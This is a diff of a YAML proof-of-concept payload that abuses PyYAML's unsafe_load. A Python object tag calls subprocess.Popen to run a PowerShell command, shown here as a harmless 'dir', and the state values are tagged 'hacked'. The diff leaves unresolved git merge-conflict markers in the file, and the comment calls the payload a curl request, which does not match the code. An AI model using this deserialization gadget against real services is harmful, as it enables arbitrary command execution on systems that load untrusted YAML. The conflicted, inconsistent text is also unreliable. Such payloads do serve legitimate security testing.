@@ -1,9 +1,15 @@
 # The `extend` function is overriden to run `yaml.unsafe_load` with 
 # custom `listitems` argument, in this case a simple curl request
+<<<<<<< HEAD
 # listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-Command", "dir"]]'
 
 - !!python/object/new:yaml.MappingNode
   listitems: !!str '!!python/object/apply:subprocess.Popen [["PowerShell", "-Command", "dir"]]'
+=======
+
+- !!python/object/new:yaml.MappingNode
+  listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-Command", "dir"]]'
+>>>>>>> 07be244be659fdae363d919464ba0f8e53f59cbd
   state:
     tag: !!str hacked
     value: !!str hacked
